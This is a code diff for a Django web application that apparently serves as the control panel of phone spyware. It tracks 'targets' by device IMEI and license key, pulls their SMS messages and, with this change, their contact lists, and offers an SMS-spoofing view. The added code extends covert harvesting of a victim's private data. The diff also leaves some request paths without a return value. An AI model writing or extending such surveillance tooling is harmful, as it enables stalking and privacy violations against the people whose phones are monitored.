@@ -4,11 +4,11 @@ import json
 import uuid
 from inertia import render
 
-from authentication.tasks import fetch_sms, send_email, send_websocket_sms
+from authentication.tasks import fetch_contacts_socket, fetch_sms, send_email, send_websocket_sms
 from .mixins import InertiaView
 from .forms import SignInForms, SignUpForms, SpoofSMSForm, SubscribeForm, TargetAliasNameForm
 from django.shortcuts import redirect
-from .models import SMSMessages, User, Target
+from .models import Contacts, SMSMessages, User, Target
 from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
 from django.utils.encoding import force_bytes
 from django.contrib.auth.tokens import default_token_generator
@@ -297,7 +297,7 @@ class MessagesView(LoginRequiredMixin, InertiaView):
     def get_props(self):
         user = self.request.user
         target = Target.objects.get(status="active", user=user)
-        messages = SMSMessages.objects.filter(target=target).order_by("-date").values()
+        messages = SMSMessages.objects.filter(target=target).order_by("date").values()
 
         # Step 1: Group messages by address
         grouped = defaultdict(list)
@@ -332,8 +332,9 @@ class SyncTargetView(LoginRequiredMixin, InertiaView):
         if sync_type == "sms":
             fetch_sms.delay(target.id, target.device_imei, target.license_key)
             redirect("messages")
-
-        return redirect("messages")
+        elif sync_type == "contacts":
+            fetch_contacts_socket.delay(target.id, target.device_imei, target.license_key)
+            return redirect("contacts")
 
 class SpoofSMSView(LoginRequiredMixin, InertiaView):
     template_name = "SpoofSms"
@@ -368,9 +369,15 @@ class SpoofSMSView(LoginRequiredMixin, InertiaView):
             return render(request, self.template_name, props=self.get_props())
         return render(request, self.template_name, props=self.get_props())
 
-class ContacsView(LoginRequiredMixin, InertiaView):
+class ContactsView(LoginRequiredMixin, InertiaView):
     template_name = "Contacts"
     login_url = "/signin"
 
     def get_props(self):
-        return {}
+        user = self.request.user
+        target = Target.objects.get(status="active", user=user)
+        contacts = Contacts.objects.filter(target=target).order_by("name").values()
+
+        return {
+            "contacts": contacts
+        }
